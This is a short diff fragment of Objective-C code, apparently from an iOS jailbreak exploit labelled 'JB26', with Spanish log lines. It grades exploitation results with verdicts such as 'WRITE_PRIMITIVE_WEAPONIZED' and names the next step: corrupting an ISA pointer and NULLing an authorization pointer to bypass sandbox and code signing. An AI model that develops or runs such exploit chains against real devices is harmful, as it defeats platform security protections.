+            log(@"JB26: [!!!] CADENA COMPLETA: write repetible + ISA corruption");
+            log(@"JB26: Siguiente paso: usar zero-write para NULLear un puntero de autorizacion");
+            log(@"JB26: en un framework de seguridad, bypass sandbox/codesign");
+        } else if (multiHits == multiTotal && multiTotal > 0) {
+            verdict = @"WRITE_PRIMITIVE_WEAPONIZED";
+            log(@"JB26: [!!] Write primitivo weaponizado — multi-target 100%% hit rate");
+            log(@"JB26: Falta: corromper ISA para redirigir ejecucion");
+        } else if (multiHits > 0) {
+            verdict = @"PARTIAL_EXPLOITATION";
+            log([NSString stringWithFormat:@"JB26: Write parcial — %d/%d hits", multiHits, multiTotal]);
+        } else {
+            log(@"JB26: Analisis completo — datos recopilados para siguiente iteracion");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB26: Verdict: %@", verdict]);
+        log(@"JB26: =============================================");
+
+        isr_checkpoint(@"JB26-cg-exploit-checkpoint.json", results);
+        done(results);
     });
 }
